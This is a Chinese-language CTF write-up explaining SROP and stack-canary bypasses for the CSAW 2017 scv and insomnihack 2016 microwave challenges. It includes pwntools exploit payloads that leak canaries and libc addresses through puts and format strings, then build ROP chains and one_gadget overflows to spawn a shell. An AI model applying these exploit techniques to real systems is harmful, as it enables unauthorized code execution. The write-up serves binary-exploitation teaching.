
```
#注释头
payload += 'a'*8 #padding
payload += p64(fake_stack_addr+0x10)#存放在0x60116c处
```

读取完之后，执行`leave`指令之前的栈底为`0x60116c`，而`leave`指令相当于：`mov rsp rbp`；和`pop rbp`：

(1)第一条`mov rsp rbp`之后，`0x60116c`就被赋值给`rsp`，也就是`rsp`指向`0x60116c`。

(2)第二条`pop rbp`之后，把`0x60116c`处的内容赋值给`rbp`，这里设置`0x60116c`处的内容为`fake_stack_addr+0x10`，也就是`0x60117c`，那么`rbp`指向`0x60117c`。`rsp`下挪一个单位，指向`0x60116c+0x08=0x601174`。

故`leave`指令执行完后`rsp = 0x601174`，`rbp = 0x60117c`。

▲这里这么设置是有原因的，为了挪动`rsp`来指向`0x601174`。

```
#注释头
payload += p64(call_read_addr)        #存放在0x601174
#存放在0x601174处，为了之后再次调用read修改rax。
```

接着执行`retn`指令，相当于`pop eip`，此时的`rsp`指向`0x601174`，所以我们需要将`0x601174`处的值变为`read_addr`的地址，也就是这条语句，这里设置`read_addr`为`0x400571`，也就是带有`call`指令的`read`。

```
注释头
payload += p64(fake_stack_addr)#存放在0x60117c，这里可以随便设置，用不到
```

`retn`指令之后就是`call`指令，各种寄存器的值还是没变，所以照常用就行，回来之后`rsp`仍旧指向`0x60117c`。此时栈状态为：

`rsp = 0x60117c`，`rbp = 0x60117c`。

```
#注释头
payload += str(frameExecve)#设置SigreturnFrame结构体
io.send(payload)

#set_read处的读取
sleep(3)

io.send('/bin/sh\x00' + ('a')*7)

#call_read处的读取。
```

读取15个字符到`0x60115c`，目的是利用`read`返回值为读取的字节数的特性设置`rax=0xf`，注意不要使`/bin/sh\x00`字符串发生改变。

最后`io.interactive()`即可`getshell`。

▲总的程序流应该是：首次`read`->`set_read`->`call_read`->`syscall`

结构体的设置，固定模式：

```
#注释头
frameExecve = SigreturnFrame() #设置SROP Frame
frameExecve.rax = constants.SYS_execve
frameExecve.rdi = binsh_addr
frameExecve.rsi = 0
frameExecve.rdx = 0
frameExecve.rip = syscall_addr
```

开头设置：

```
#注释头
syscall_addr = 0x400560
set_read_addr = 0x40055b
read_addr = 0x400571
fake_stack_addr = 0x60116c
binsh_addr = 0x60115c
```

参考资料：

[b58K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1j5Y4y4Q4x3X3g2A6j5$3S2#2L8Y4q4A6N6g2)9J5k6h3y4G2L8g2)9J5c8X3k6G2M7Y4g2E0i4K6u0W2M7r3S2H3i4K6y4r3L8h3!0V1i4K6y4p5j5$3!0D9L8r3g2U0N6r3W2G2L8W2)9J5y4X3q4E0M7q4)9K6b7X3q4U0N6r3W2G2L8W2)9K6c8s2k6A6k6i4N6Q4x3U0k6S2L8i4m8Q4x3@1u0U0N6r3W2V1i4K6y4p5x3e0f1%4](https://bbs.kanxue.com/elink@8d8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1j5Y4y4Q4x3X3g2A6j5$3S2#2L8Y4q4A6N6g2)9J5k6h3y4G2L8g2)9J5c8X3k6G2M7Y4g2E0i4K6u0W2M7r3S2H3i4K6y4r3L8h3!0V1i4K6y4p5j5$3!0D9L8r3g2U0N6r3W2G2L8W2)9J5y4X3q4E0M7q4)9K6b7X3q4U0N6r3W2G2L8W2)9K6c8s2k6A6k6i4N6Q4x3U0k6U0N6r3W2V1i4K6y4p5x3e0f1%4)

# Canary绕过0x09

## 一、CSAW Quals CTF 2017-scv

1.常规`checksec`，开启了`NX`和`Canary`。打开`IDA`发现程序两个漏洞：

(1)功能1中栈溢出：

```
#注释头
char buf; // [rsp+10h] [rbp-B0h]
--------------------------------------
v25 = read(0, &buf, 0xF8uLL);
```

(2)功能2中输出字符串：`puts(&buf)`；

注：这里的`put`和`printf`不是同一个概念，不是格式化字符串的函数。但是由于`put`是直接输出我们的输入，而我们的输入被保存在`main`函数栈上，所以可以输入足够多的数据连上`canary`，利用`put`一并打印出来，从而把`canary`泄露出来。

2.调试，`IDA`中观察位置，计算偏移，可以知道偏移为`0xB0-0x8=0xA8=168`个字符，( `canary`通常被放在`rbp-0x08`的位置处，当然也不一定，最好还是调试一下)这样就可以构造第一个`payload`：`payload1 = ”A”*168 + “B”`。

这里再加一个`B`是因为`canary`的保护机制，一般情况下`canary`的最后两位也就是最后一个字符都是`\x00`，由于是大端序，所以可以防止不小心把`canary`泄露出来。因为上一个栈内存的最后第一个字符连接的是下一个栈内存的第一个字符，也就是`canary`中的`\x00`，而打印函数默认`00`是字符串的结尾，所以这里如果输入`”A”*168`，那么打印出来的就只会是168个`A`，不会将`canary`带出来。所以我们再加一个`B`，覆盖掉`canary`在占内存的第一个字符`00`，从而能够连接上成为一个完整的字符串打印出来。但又由于是大端序，泄露出来的`canary`应该最后一个字符是`B`，对应`\x42`，这里需要修改成`\x00`从而获得正确的`canary`。同理，如果随机化的`canary`中含有`\x00`，那么仍然会导致字符串截断，无法得到正确的`canary`。所以其实如果多执行几次，碰到包含`\x00`的`canary`，就会导致程序出错。

泄露加修改：`canary = u64('\x00'+io.recv(7))`

3.之后就可以利用`canary`的值和栈溢出，调用`put`函数打印其它函数的实际地址。这里程序使用了`read`函数，并且同时外部调用了`read`函数，可以通过输入`read`的`.got`表的值，使其打印`read`函数的真实地址。同时需要注意的是，由于是64位程序，传参是从`rdi`开始，所以栈溢出的第一个返回地址应该给`rdi`赋值才对，编写`payload1`。

```
#注释头
payload1 = ""
payload1 += "A"*168 #padding
payload1 += p64(canary) #在canary应该在的位置上写canary
payload1 += "B"*8 #这一段实际上是rbp的位置
payload1 += p64(pop_rdi)   
#跳转到pop rdi;retn;所在语句(可以通过ROPgadget查询)，来给rdi传入read函数的got表中的地址。
payload1 += p64(read_got) #被pop rdi语句调用，出栈
payload1 += p64(puts_plt)
#retn到put函数的plt表，调用put函数。
payload1 += p64(start)
#调用之后，返回程序最开始，恢复栈帧，再执行一遍程序
```

这样就可以得到`read`的实际地址，从而通过`libc`库计算偏移地址得到基地址。

5.现在有了`libc`库的基地址，观察`main`函数退出时的汇编代码：`mov eax, 0`可以使用在2.24`libc`库条件下可以使用`onegadget`。

6.直接计算`onegadget`偏移，然后覆盖`main`函数的返回地址，`getshell`。

参考资料：

[28dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1j5Y4y4Q4x3X3g2A6j5$3S2#2L8Y4q4A6N6g2)9J5k6h3y4G2L8g2)9J5c8X3k6G2M7Y4g2E0i4K6u0W2M7r3S2H3i4K6y4r3L8h3!0V1i4K6y4p5j5$3!0D9L8r3g2U0N6r3W2G2L8W2)9J5y4X3q4E0M7q4)9K6b7X3q4U0N6r3W2G2L8W2)9K6c8s2k6A6k6i4N6Q4x3U0k6S2L8i4m8Q4x3@1u0U0N6r3W2V1i4K6y4p5x3e0f1%4](https://bbs.kanxue.com/elink@701K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1j5Y4y4Q4x3X3g2A6j5$3S2#2L8Y4q4A6N6g2)9J5k6h3y4G2L8g2)9J5c8X3k6G2M7Y4g2E0i4K6u0W2M7r3S2H3i4K6y4r3L8h3!0V1i4K6y4p5j5$3!0D9L8r3g2U0N6r3W2G2L8W2)9J5y4X3q4E0M7q4)9K6b7X3q4U0N6r3W2G2L8W2)9K6c8s2k6A6k6i4N6Q4x3U0k6U0N6r3W2V1i4K6y4p5x3e0f1%4)

## 二、insomnihack CTF 2016-microwave

1.常规`checksec`，程序全部开启保护，并且有`canary`保护，从`IDA`中汇编代码和伪代码也可以看到：

(1)汇编代码：

①生成`canary`的代码:一般在函数初始化的时候就可以看到

```
#注释头
mov rax,fs:28h
mov [rsp+28h+var_20], rax
```

![](https://bbs.kanxue.com/upload/attach/202108/904686_78HA5CDFGDRKZ43.jpg)

②校验:

```
#注释头
mov rax, [rsp+28h+var_20]
xor rax, fs:28h
jnz short func
```

![](https://bbs.kanxue.com/upload/attach/202108/904686_MVEE2WSCGFGN793.jpg)

(2)伪代码：

```
#注释头
v_canary = __readfsqword(0x28u);
return __readfsqword(0x28u) ^ v_canary;
```

有很多种形式，如下也是一种：

![](https://bbs.kanxue.com/upload/attach/202108/904686_GQPTZQTHXRFBCVQ.jpg)

2.之后查找漏洞，找到两个漏洞：

(1)功能1的`sub_F00`函数中的`printf`存在格式化字符串漏洞：

```
#注释头
__printf_chk(1LL, a1);
```

这里的`1LL`不知道是个什么意思，但是实际效果仍然相当于是`printf(a1)`，调试中可以知道。

(2)功能2的`sub_1000`存在栈溢出漏洞：

```
#注释头
__int64 v1; // [rsp+0h] [rbp-418h]
------------------------------------------------------
read(0, &v1, 0x800uLL);
```

3.现在是保护全开，栈溢出漏洞因为`canary`的关系没办法利用，唯一能利用的只有一个`printf()`函数，而且还没办法劫持`got`表，没办法进行完全栈操控。所以这里就想能不能通过`printf`函数泄露`canary`从而使得栈溢出这个漏洞派上用场。

4.首先调试，观察`canary`在栈上的偏移位置，调试断点下在`sub_F00`函数的`printf`函数上，因为这个`sub_F00`函数中也有`canary`的保护，那么该函数栈上一定存在`canary`的值。自己调试如下图：

![](https://bbs.kanxue.com/upload/attach/202108/904686_6QC98DRS5EG3PE2.jpg)

`IDA`调试界面点击对应生成`canary`的代码`mov [rsp+28h+var_20], rax`中的`[rsp+28h+var_20]`就可以知道`canary`的位置应该是`rsp+8h`处，这里也可以看出来`V6`就是`canary`。

另外由于这是64位程序，取参顺序是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`, 栈，由于`printf()`前两个参数为`rdi`, `rsi`，对应的是`fd`和`&buf`，

这里的`buf`就是我们输入的`username`，因为`username`的输入保存在堆上`main`函数中有声明：

```
#注释头
void *v4; // r12
----------------------------------------------------------------
v4 = malloc(0x3EuLL);
-------------------------------------------------------------------
fwrite(" username: ", 1uLL, 0x15uLL, stdout);
fflush(0LL);
fgets((char *)v4, 40, stdin);
--------------------------------------------------------------------
fwrite(" password: ", 1uLL, 0x15uLL, stdout);
fflush(0LL);
v3 = 20LL;
fgets((char *)v4 + 40, 20, stdin);
------------------------------------------------------------------------
sub_F00((__int64)v4);
--------------------------------------------------------------------
unsigned __int64 __fastcall sub_F00(__int64 a1)
-------------------------------------------------------------------
__printf_chk(1LL, a1);
```

下图是没有打印之前的内容：

![](https://bbs.kanxue.com/upload/attach/202108/904686_96CSTP7QDU54UQU.jpg)

我们可以看到`rsi`的值是5开头的，这其实就是一个堆内存地址，调试过程中输入跳转就可以看到该地址对应的内容就是我们的输入`username`的值。那么输入`username`时输入多个`%p`，触发格式化字符串漏洞，打印寄存器和栈上的内容，泄露出`libc`地址和`canary`。`printf()`依次根据`%p`打印的参数顺序是`rdx`, `rcx`, `r8`, `r9`, 栈。所以`r9`之后第一个打印出来的数据是`rsp-8h`，也就是`canary`的值，这样就可以得到泄露的`canary`的值，从而控制栈溢出。同时我们可以发现打印出来的数据中包含`libc`中的函数，这样同时也泄露出来了`libc`加载后的地址，之后通过偏移计算出基地址。

5.之后进行栈溢出操控，但是这里如果连不上账户会没办法使用`sub_1000`函数，用`IDA`查看可以看到在`sub_f00`函数中对密码进行检查，可直接查看到密码：

![](https://bbs.kanxue.com/upload/attach/202108/904686_UE6PDZP9U49QY53.jpg)

这个`off_204010`就是密码，点进去就可以看到。

由之前步骤可以得到`canary`和`libc`基地址。查询之后可以发现由于`retn`前会检查`canary`，对应汇编代码是：

`xor rax, fs:28h`

那么如果`canary`输入成功，`xor`之后会使得`rax`一定为0，满足该`libc`库的`Onegadget`条件，所以这里可以直接使用`Onegadget`：

```
#注释头
payload = "A"*1032 #padding
payload += p64(canary) #正确的canary
payload += "B"*8 #padding
payload += p64(one_gadget_addr) #one gadget RCE
io.sendline('2') #使用有栈溢出的功能2
io.recvuntil('#> ')
io.sendline(payload)
```

参考资料：
